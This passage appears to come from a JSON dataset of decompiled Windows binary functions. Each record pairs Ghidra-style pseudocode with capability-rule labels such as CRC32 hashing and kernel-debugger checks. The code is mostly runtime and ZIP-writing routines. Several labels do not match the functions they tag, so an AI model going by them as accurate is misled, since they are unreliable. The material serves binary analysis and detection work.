0x4466a0);\n        }\n        *(iVar1 + 0xfe4) = 0;\n        *(iVar1 + 0xfe8) = 0;\n        *(iVar1 + 0xfec) = 0;\n        *(iVar1 + 0xff0) = 0;\n        *(iVar1 + 0xff4) = 0;\n        *(iVar1 + 0xff8) = 0;\n        *(iVar1 + 0xffc) = 0;\n        *(iVar1 + 0x1000) = 0;\n        puVar4 = iVar1 + 0xa02;\n        iVar3 = 0x18;\n        do {\n            puVar4[-2] = 8;\n            *(iVar1 + 0xff4) = *(iVar1 + 0xff4) + 1;\n            *puVar4 = 8;\n            *(iVar1 + 0xff4) = *(iVar1 + 0xff4) + 1;\n            puVar4[2] = 8;\n            *(iVar1 + 0xff4) = *(iVar1 + 0xff4) + 1;\n            puVar4[4] = 8;\n            *(iVar1 + 0xff4) = *(iVar1 + 0xff4) + 1;\n            puVar4[6] = 8;\n            *(iVar1 + 0xff4) = *(iVar1 + 0xff4) + 1;\n            puVar4[8] = 8;\n            *(iVar1 + 0xff4) = *(iVar1 + 0xff4) + 1;\n            puVar4 = puVar4 + 0xc;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n        puVar4 = iVar1 + 0xc3e;\n        iVar3 = 0x70;\n        do {\n            *puVar4 = 9;\n            *(iVar1 + 0xff6) = *(iVar1 + 0xff6) + 1;\n            puVar4 = puVar4 + 2;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n        iVar3 = 0x18;\n        puVar4 = iVar1 + 0xdfe;\n        do {\n            *puVar4 = 7;\n            *(iVar1 + 0xff2) = *(iVar1 + 0xff2) + 1;\n            puVar4 = puVar4 + 2;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n        puVar4 = iVar1 + 0xe5e;\n        iVar3 = 8;\n        do {\n            *puVar4 = 8;\n            *(iVar1 + 0xff4) = *(iVar1 + 0xff4) + 1;\n            puVar4 = puVar4 + 2;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n        fcn.00424870(iVar1, iVar1 + 0x9fc, 0x11f);\n        uVar13 = 0;\n        puVar10 = iVar1 + 0xe7c;\n        do {\n            puVar10[1] = 5;\n            iVar3 = 5;\n            uVar2 = 0;\n            uVar6 = uVar13;\n            do {\n                uVar5 = uVar2;\n                uVar11 = uVar6 & 1;\n                iVar3 = iVar3 + -1;\n                uVar6 = uVar6 >> 1;\n                uVar2 = (uVar5 | uVar11) * 2;\n            } while (0 < iVar3);\n            *puVar10 = uVar5 | uVar11;\n            uVar13 = uVar13 + 1;\n            puVar10 = puVar10 + 2;\n        } while (uVar13 < 0x1e);\n        fcn.00422550(iVar1);\n    }\n    return;\n}\n",
        "token_count": 1737
    },
    "00425e60": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __thiscall fcn.00425e60(char **param_1, char *param_2, int32_t param_3, uint param_4, int32_t param_5)\n\n{\n    char **ppcVar1;\n    uint8_t uVar2;\n    int32_t *piVar3;\n    char cVar4;\n    uchar uVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    char *pcVar11;\n    uint *puVar12;\n    uint *puVar13;\n    char *pcVar14;\n    char *pcVar15;\n    uint unaff_EBP;\n    int16_t iVar16;\n    ushort *puVar17;\n    char *pcVar18;\n    uint *puVar19;\n    bool bVar20;\n    uint uStack1196;\n    int32_t iStack1192;\n    int32_t iStack1188;\n    int32_t *piStack1184;\n    uint uStack1180;\n    uint uStack1176;\n    char *pcStack1172;\n    int32_t iStack1168;\n    char *pcStack1164;\n    char *pcStack1160;\n    int32_t iStack1156;\n    int32_t iStack1152;\n    uint uStack1148;\n    uint uStack1144;\n    ushort uStack1140;\n    ushort uStack1138;\n    uint16_t uStack1136;\n    char *pcStack1132;\n    char *pcStack1128;\n    uchar uStack1124;\n    uint *puStack864;\n    uint *puStack860;\n    uchar auStack856 [4];\n    char acStack852 [260];\n    uchar uStack592;\n    uint uStack332;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    uint uStack312;\n    uchar uStack308;\n    uchar uStack307;\n    uchar uStack306;\n    uchar uStack305;\n    uchar uStack304;\n    uchar uStack303;\n    uchar uStack302;\n    uchar uStack301;\n    uchar uStack300;\n    uint8_t auStack296 [12];\n    uint uStack284;\n    uint uStack280;\n    uchar uStack276;\n    char acStack272 [8];\n    char acStack264 [260];\n    uint32_t uStack4;\n    \n    uStack4 = *0x44d6a0 ^ &uStack1196;\n    uStack1176 = param_1;\n    iStack1192 = param_3;\n    if ((param_1[5] != NULL) || (*(param_1 + 0xb) != '\\0')) goto code_r0x004266cf;\n    piStack1184 = NULL;\n    if ((*param_1 != NULL) && (param_5 != 4)) {\n        piStack1184 = 0xc;\n    }\n    iVar7 = -param_2;\n    do {\n        cVar4 = *param_2;\n        param_2[acStack264 + iVar7] = cVar4;\n        param_2 = param_2 + 1;\n    } while (cVar4 != '\\0');\n    if (acStack264[0] == '\\0') goto code_r0x004266cf;\n    pcVar6 = acStack264;\n    do {\n        if (*pcVar6 == '\\\\') {\n            *pcVar6 = '/';\n        }\n        pcVar6 = pcVar6 + 1;\n    } while (*pcVar6 != '\\0');\n    uStack1196._0_3_ = CONCAT12(param_5 == 4, uStack1196);\n    uStack1196 = uStack1196;\n    if (param_5 == 4) {\n        pcVar6 = acStack264;\n        do {\n            pcVar11 = pcVar6;\n            pcVar6 = pcVar11 + 1;\n        } while (*pcVar11 != '\\0');\n        uStack1196 = CONCAT13(1, uStack1196);\n        if (pcVar11[-1] == '/') goto code_r0x00425f3d;\n    }\n    else {\ncode_r0x00425f3d:\n        uStack1196 = uStack1196 & 0xffffff;\n    }\n    iVar16 = 8;\n    uStack1180 = 8;\n    if ((uStack1196._2_1_ != '\\0') || (cVar4 = fcn.00423bf0(acStack264),  cVar4 != '\\0')) {\n        iVar16 = 0;\n        uStack1180 = 0;\n    }\n    if (param_5 == 2) {\n        iVar7 = fcn.00425090(iStack1192);\n    }\n    else if (param_5 == 1) {\n        iVar7 = fcn.004242f0(iStack1192, param_4);\n    }\n    else if (param_5 == 3) {\n        iVar7 = fcn.00424470(iStack1192, param_4);\n    }\n    else {\n        if (param_5 != 4) goto code_r0x004266cf;\n        iVar7 = fcn.00424580();\n    }\n    if (iVar7 == 0) {\n        uStack320 = 0;\n        uStack1124 = 0;\n        iVar7 = 0;\n        do {\n            pcVar6 = acStack272 + iVar7;\n            acStack852[iVar7] = *pcVar6;\n            iVar7 = iVar7 + 1;\n        } while (*pcVar6 != '\\0');\n        pcVar6 = acStack852;\n        do {\n            cVar4 = *pcVar6;\n            pcVar6 = pcVar6 + 1;\n        } while (cVar4 != '\\0');\n        iStack1156 = pcVar6 - (acStack852 + 1);\n        if (unaff_EBP >> 0x18 != '\\0') {\n            puVar17 = auStack856 + 3;\n            do {\n                pcVar11 = puVar17 + 1;\n                puVar17 = puVar17 + 1;\n            } while (*pcVar11 != '\\0');\n            *puVar17 = *0x446b74;\n            iStack1156 = (pcVar6 - (acStack852 + 1)) + 1;\n        }\n        uStack1138 = 0;\n        pcStack1172 = param_1[0x1a];\n        uStack1136 = 8;\n        uStack592 = 0;\n        auStack856 = 0;\n        uStack1144 = 0;\n        uStack332 = 1;\n        uStack324 = 0;\n        uStack1180 = 0x140b17;\n        iStack1168 = 0;\n        uStack1176._0_2_ = 8;\n        if ((*param_1 != NULL) && (unaff_EBP >> 0x10 == '\\0')) {\n            uStack1136 = 9;\n            uStack1176._0_2_ = 9;\n        }\n        uStack1176 = CONCAT22(iVar16, uStack1176);\n        if ((iVar16 == 0) && (-1 < param_1[0x1c])) {\n            pcStack1164 = param_1[0x1c] + iStack1192;\n        }\n        else {\n            pcStack1164 = NULL;\n        }\n        pcStack1160 = param_1[0x1c];\n        pcStack1132 = param_1[0x13];\n        pcStack1128 = param_1[6] + param_1[4];\n        uStack1140 = 0;\n        puStack864 = &uStack316;\n        puStack860 = &uStack284;\n        pcVar6 = param_1[0x16];\n        uStack308 = pcVar6 >> 0x18;\n        uStack307 = *(param_1 + 0x14);\n        pcVar11 = param_1[0x14];\n        uStack306 = pcVar11 >> 8;\n        uStack304 = pcVar11 >> 0x18;\n        uStack305 = pcVar11 >> 0x10;\n        uStack303 = *(param_1 + 0x18);\n        pcVar11 = param_1[0x18];\n        uStack302 = pcVar11 >> 8;\n        uStack300 = pcVar11 >> 0x18;\n        uStack301 = pcVar11 >> 0x10;\n        uStack316 = 0xd5455;\n        uStack312 = CONCAT31(CONCAT12(pcVar6 >> 0x10, CONCAT11(pcVar6 >> 8, *(param_1 + 0x16))), 7);\n        iStack1152 = 0x11;\n        uStack1148 = 9;\n        uStack280 = uStack312;\n        uStack284 = 0x55455;\n        uStack276 = uStack308;\n        iVar7 = fcn.00423160(&uStack1180, 0x425070, param_1);\n        if (iVar7 == 0) {\n            param_1[6] = param_1[6] + iStack1152 + 0x1e + iStack1156;\n            if (param_1[5] == NULL) {\n                ppcVar1 = param_1 + 0xc;\n                param_1[0xd] = 0x23456789;\n                param_1[0xe] = 0x34567890;\n                pcVar6 = *param_1;\n                *ppcVar1 = 0x12345678;\n                for (; (pcVar6 != NULL && (*pcVar6 != '\\0')); pcVar6 = pcVar6 + 1) {\n                    fcn.00423ba0(ppcVar1, *pcVar6);\n                }\n                if (*0x4600c8 == '\\0') {\n                    uVar8 = (**0x45fdf0)();\n                    uVar9 = (**0x460004)();\n                    fcn.00429a1d(uVar8 ^ uVar9);\n                }\n                iVar7 = 0;\n                do {\n                    iVar10 = fcn.00429a2f();\n                    piVar3 = piStack1184;\n                    auStack296[iVar7] = iVar10 >> 7;\n                    iVar7 = iVar7 + 1;\n                } while (iVar7 < 0xc);\n                uStack1196 = param_1[0xd];\n                pcVar6 = *ppcVar1;\n                auStack296[11] = pcStack1172 >> 8;\n                pcVar11 = param_1[0xe];\n                iVar7 = 0;\n                do {\n                    uVar2 = auStack296[iVar7];\n                    pcVar14 = *(((uVar2 ^ pcVar6) & 0xff) * 4 + 0x446740) ^ pcVar6 >> 8;\n                    pcVar18 = (uStack1196 + (pcVar14 & 0xff)) * 0x8088405 + 1;\n                    *ppcVar1 = pcVar14;\n                    param_1[0xd] = pcVar18;\n                    pcVar6 = pcVar11 >> 8 ^ *(((pcVar18 >> 0x18 ^ pcVar11) & 0xff) * 4 + 0x446740);\n                    uVar8 = pcVar11 & 0xfffd | 2;\n                    param_1[0xe] = pcVar6;\n                    auStack296[iVar7] = (uVar8 ^ 1) * uVar8 >> 8 ^ uVar2;\n                    pcVar15 = *(((auStack296[iVar7 + 1] ^ pcVar14) & 0xff) * 4 + 0x446740) ^ pcVar14 >> 8;\n                    pcVar14 = (pcVar18 + (pcVar15 & 0xff)) * 0x8088405 + 1;\n                    param_1[0xd] = pcVar14;\n                    *ppcVar1 = pcVar15;\n                    pcVar11 = pcVar6 >> 8 ^ *(((pcVar14 >> 0x18 ^ pcVar6) & 0xff) * 4 + 0x446740);\n                    uVar8 = pcVar6 & 0xfffd | 2;\n                    uVar2 = auStack296[iVar7 + 1];\n                    param_1[0xe] = pcVar11;\n                    auStack296[iVar7 + 1] = (uVar8 ^ 1) * uVar8 >> 8 ^ uVar2;\n                    uVar8 = pcVar11 & 0xfffd | 2;\n                    pcVar6 = *(((auStack296[iVar7 + 2] ^ pcVar15) & 0xff) * 4 + 0x446740) ^ pcVar15 >> 8;\n                    pcVar14 = (pcVar14 + (pcVar6 & 0xff)) * 0x8088405 + 1;\n                    *ppcVar1 = pcVar6;\n                    param_1[0xd] = pcVar14;\n                    pcVar11 = pcVar11 >> 8 ^ *(((pcVar14 >> 0x18 ^ pcVar11) & 0xff) * 4 + 0x446740);\n                    uVar2 = auStack296[iVar7 + 2];\n                    param_1[0xe] = pcVar11;\n                    auStack296[iVar7 + 2] = (uVar8 ^ 1) * uVar8 >> 8 ^ uVar2;\n                    pcVar6 = *(((auStack296[iVar7 + 3] ^ pcVar6) & 0xff) * 4 + 0x446740) ^ pcVar6 >> 8;\n                    uVar8 = pcVar11 & 0xfffd | 2;\n                    uStack1196 = (pcVar14 + (pcVar6 & 0xff)) * 0x8088405 + 1;\n                    param_1[0xd] = uStack1196;\n                    uVar2 = auStack296[iVar7 + 3];\n                    *ppcVar1 = pcVar6;\n                    pcVar11 = pcVar11 >> 8 ^ *(((uStack1196 >> 0x18 ^ pcVar11) & 0xff) * 4 + 0x446740);\n                    auStack296[iVar7 + 3] = (uVar8 ^ 1) * uVar8 >> 8 ^ uVar2;\n                    iVar7 = iVar7 + 4;\n                    param_1[0xe] = pcVar11;\n                } while (iVar7 < 0xc);\n                if ((*piStack1184 != 0) && (unaff_EBP >> 0x10 == '\\0')) {\n                    fcn.00424140();\n                    piVar3[6] = piVar3[6] + 0xc;\n                }\n                iVar7 = 0;\n                cVar4 = unaff_EBP >> 0x10;\n                if ((*piVar3 == 0) || (cVar4 != '\\0')) {\n                    uVar5 = 0;\n                }\n                else {\n                    uVar5 = 1;\n                }\n                *(piVar3 + 0x2d) = uVar5;\n                if (cVar4 == '\\0') {\n                    if (iStack1188 == 8) {\n                        iVar7 = fcn.00425d50();\n                    }\n                    else if (iStack1188 == 0) {\n                        iVar7 = fcn.004247b0();\n                    }\n                }\n                else {\n                    piVar3[0x24] = 0;\n                }\n                *(piVar3 + 0x2d) = 0;\n                if ((*(piVar3 + 0x20) != '\\0') && (piVar3[0x1f] != 0)) {\n                    (**0x45fe30)(piVar3[0x1f]);\n                }\n                pcVar6 = piVar3[0x1d];\n                piVar3[6] = piVar3[6] + piVar3[0x24];\n                piVar3[0x1f] = 0;\n                piVar3[0x1c] = pcVar6;\n                if ((piVar3[5] == 0) && (iVar7 == 0)) {\n                    iStack1168 = piVar3[0x1e];\n                    pcVar11 = iStack1192 + piVar3[0x24];\n                    bVar20 = pcStack1164 != pcVar11;\n                    pcStack1164 = pcVar11;\n                    pcStack1160 = pcVar6;\n                    if ((*(piVar3 + 7) == '\\0') || ((*piVar3 != 0 && (unaff_EBP >> 0x10 == '\\0')))) {\n                        if ((uStack1176._2_2_ != iStack1188) ||\n                           (((iStack1188 == 0 && (bVar20)) ||\n                            (iVar7 = fcn.004233e0(&uStack1180, 0x425070, piVar3),  iVar7 != 0)))) goto code_r0x004266cf;\n                        piVar3[6] = piVar3[6] + 0x10;\n                        uStack1176 = uStack1176 & 0xffff0000 | uStack1136;\n                    }\n                    else {\n                        uVar8 = uStack1176 & 0xffff;\n                        if ((uStack1176 & 1) == 0) {\n                            uVar8 = uStack1176 & 0xfff7;\n                        }\n                        uStack1176 = uVar8 | iStack1188 << 0x10;\n                        uStack1176._0_2_ = uVar8;\n                        uStack1136 = uStack1176;\n                        cVar4 = fcn.00424290();\n                        if (((cVar4 == '\\0') || (iVar7 = fcn.00423160(&piStack1184, 0x425070, piVar3),  iVar7 != 0)) ||\n                           (cVar4 = fcn.00424290(),  cVar4 == '\\0')) goto code_r0x004266cf;\n                    }\n                    if (piVar3[5] == 0) {\n                        puVar12 = fcn.00427f31(uStack1148);\n                        fcn.004274e0(puVar12, puStack860, uStack1148);\n                        puStack860 = puVar12;\n                        puVar13 = fcn.00427f31(0x360);\n                        puVar12 = &uStack1180;\n                        puVar19 = puVar13;\n                        for (iVar7 = 0xd8; iVar7 != 0; iVar7 = iVar7 + -1) {\n                            *puVar19 = *puVar12;\n                            puVar12 = puVar12 + 1;\n                            puVar19 = puVar19 + 1;\n                        }\n                        iVar7 = piVar3[0x11];\n                        if (iVar7 == 0) {\n                            piVar3[0x11] = puVar13;\n                        }\n                        else {\n                            iVar10 = *(iVar7 + 0x35c);\n                            while (iVar10 != 0) {\n                                iVar7 = *(iVar7 + 0x35c);\n                                iVar10 = *(iVar7 + 0x35c);\n                            }\n                            *(iVar7 + 0x35c) = puVar13;\n                        }\n                    }\n                }\n            }\n            else {\n                fcn.00424750();\n            }\n        }\n        else {\n            fcn.00424750();\n        }\n    }\ncode_r0x004266cf:\n    fcn.00427841(unaff_EBP);\n    return;\n}\n",
        "token_count": 4372
    },
    "00427f31": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427f31(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    code *var_10h;\n    char *var_4h;\n    \n    do {\n        iVar2 = fcn.0042740a(arg_8h);\n        if (iVar2 != 0) {\n            return;\n        }\n        iVar2 = fcn.0042cad0(arg_8h);\n    } while (iVar2 != 0);\n    if ((*0x4602ec & 1) == 0) {\n        *0x4602ec = *0x4602ec | 1;\n        var_4h = \"bad allocation\";\n        fcn.00427850(&var_4h);\n        *0x4602e0 = vtable.std::bad_alloc.0;\n        fcn.00428ace(0x43c5f1);\n    }\n    fcn.00427984(0x4602e0);\n    var_10h = vtable.std::bad_alloc.0;\n    fcn.00427fb1(&var_10h, 0x44a520);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 274
    },
    "004300db": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004300db(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0042f1d0(0x44c360, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.0042b684();\n        *puVar2 = 0;\n        puVar2 = fcn.0042b671();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x461078)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x461080;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.00436ed6(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.0042b671();\n                    *puVar2 = 9;\n                    puVar2 = fcn.0042b684();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.0042f9de(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.004301a7();\n                goto code_r0x0043019e;\n            }\n        }\n        puVar2 = fcn.0042b684();\n        *puVar2 = 0;\n        puVar2 = fcn.0042b671();\n        *puVar2 = 9;\n        fcn.0042cf92();\n    }\ncode_r0x0043019e:\n    fcn.0042f215();\n    return;\n}\n",
        "token_count": 610
    },
    "00435837": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00435837(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0042f1d0(0x44c420, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.0042b684();\n        *puVar2 = 0;\n        puVar2 = fcn.0042b671();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x461078)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x461080;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.00436ed6(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.0042b671();\n                    *puVar2 = 9;\n                    puVar2 = fcn.0042b684();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.004357c2(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.00435903();\n                goto code_r0x004358fa;\n            }\n        }\n        puVar2 = fcn.0042b684();\n        *puVar2 = 0;\n        puVar2 = fcn.0042b671();\n        *puVar2 = 9;\n        fcn.0042cf92();\n    }\ncode_r0x004358fa:\n    fcn.0042f215();\n    return;\n}\n",
        "token_count": 606
    },
    "00435ebf": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00435ebf(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    uint unaff_EBX;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x44d6a0 ^ &stack0xfffffffc;\n    var_20h = arg_8h;\n    var_1ch = arg_ch;\n    var_18h = fcn.0042dd7d();\n    var_14h = 0;\n    if (*0x46100c == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(L\"USER32.DLL\");\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if ((iVar1 == 0) ||\n           (iVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"MessageBoxW\"), \n           pcVar4 = _sym.imp.KERNEL32.dll_EncodePointer,  iVar2 == 0)) goto code_r0x0043601c;\n        *0x46100c = (*_sym.imp.KERNEL32.dll_EncodePointer)(iVar2);\n        uVar3 = (*pcVar6)(iVar1, \"GetActiveWindow\");\n        *0x461010 = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, \"GetLastActivePopup\");\n        *0x461014 = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, \"GetUserObjectInformationW\");\n        *0x46101c = (*pcVar4)(uVar3);\n        if (*0x46101c != 0) {\n            uVar3 = (*pcVar6)(iVar1, \"GetProcessWindowStation\");\n            *0x461018 = (*pcVar4)(uVar3);\n        }\n    }\n    pcVar6 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if ((*0x461018 == var_18h) || (*0x46101c == var_18h)) {\ncode_r0x00435fcb:\n        if ((((*0x461010 != var_18h) && (pcVar4 = (*pcVar6)(*0x461010),  pcVar4 != NULL)) &&\n            (var_14h = (*pcVar4)(),  var_14h != 0)) &&\n           ((*0x461014 != var_18h && (pcVar4 = (*pcVar6)(*0x461014),  pcVar4 != NULL)))) {\n            var_14h = (*pcVar4)(var_14h);\n        }\n    }\n    else {\n        pcVar4 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x461018);\n        pcVar5 = (*pcVar6)(*0x46101c);\n        if (((pcVar4 == NULL) || (pcVar5 == NULL)) ||\n           (((iVar1 = (*pcVar4)(),  iVar1 != 0 && (iVar1 = (*pcVar5)(iVar1, 1, &var_10h, 0xc, &var_24h),  iVar1 != 0))\n            && ((var_8h & 1) != 0)))) goto code_r0x00435fcb;\n        arg_10h = arg_10h | 0x200000;\n    }\n    pcVar6 = (*pcVar6)(*0x46100c);\n    if (pcVar6 != NULL) {\n        (*pcVar6)(var_14h, var_20h, var_1ch, arg_10h);\n    }\ncode_r0x0043601c:\n    fcn.00427841(unaff_EBX);\n    return;\n}\n",
        "token_count": 921
    },
    "0043716d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0043716d(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x44d6a0 ^ &stack0xfffffffc;\n    fcn.004283e1(arg_10h);\n    var_14h = fcn.0043908f(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.004385ed(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x004371c6:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00437206;\n        }\n        if (iVar1 != 2) {\ncode_r0x004371f8:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00437206;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x004371f8;\n        goto code_r0x004371c6;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x00437206:\n    fcn.00427841(unaff_EBX);\n    return;\n}\n",
        "token_count": 500
    },
    "00437215": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00437215(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x44d6a0 ^ &stack0xfffffffc;\n    fcn.004283e1(arg_10h);\n    var_14h = fcn.0043908f(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.00438b3e(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0043726e:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x004372ae;\n        }\n        if (iVar1 != 2) {\ncode_r0x004372a0:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x004372ae;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x004372a0;\n        goto code_r0x0043726e;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x004372ae:\n    fcn.00427841(unaff_EBX);\n    return;\n}\n",
        "token_count": 501
    },
    "0043976b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_74h\n// WARNING: Removing unreachable block (ram,0x00439c7a)\n// WARNING: Removing unreachable block (ram,0x00439c84)\n// WARNING: Removing unreachable block (ram,0x00439c89)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0043976b(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h, int32_t arg_14h, uint32_t arg_18h, int16_t *arg_1ch)\n\n{\n    int16_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    bool bVar5;\n    uint16_t *puVar6;\n    uint16_t uVar7;\n    uint32_t extraout_ECX;\n    int32_t *piVar8;\n    uint16_t uVar9;\n    uint16_t uVar10;\n    uint32_t uVar11;\n    char cVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    int16_t *piVar15;\n    int16_t *piVar16;\n    uint16_t uVar17;\n    int32_t iVar18;\n    uint32_t uVar19;\n    uint *puVar20;\n    char *pcVar21;\n    uint var_74h;\n    uint16_t *var_70h;\n    int32_t *var_6ch;\n    int32_t var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint *var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_20h;\n    uint16_t var_1ch;\n    uint32_t var_1ah;\n    uint var_16h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x44d6a0 ^ &stack0xfffffffc;\n    var_60h._0_2_ = arg_10h & 0x8000;\n    uVar11 = arg_10h & 0x7fff;\n    var_30h = 0xcccccccc;\n    var_2ch = 0xcccccccc;\n    var_28h._0_2_ = 0xcccc;\n    var_28h._2_2_ = 0x3ffb;\n    if ((arg_10h & 0x8000) == 0) {\n        *(arg_1ch + 1) = 0x20;\n    }\n    else {\n        *(arg_1ch + 1) = 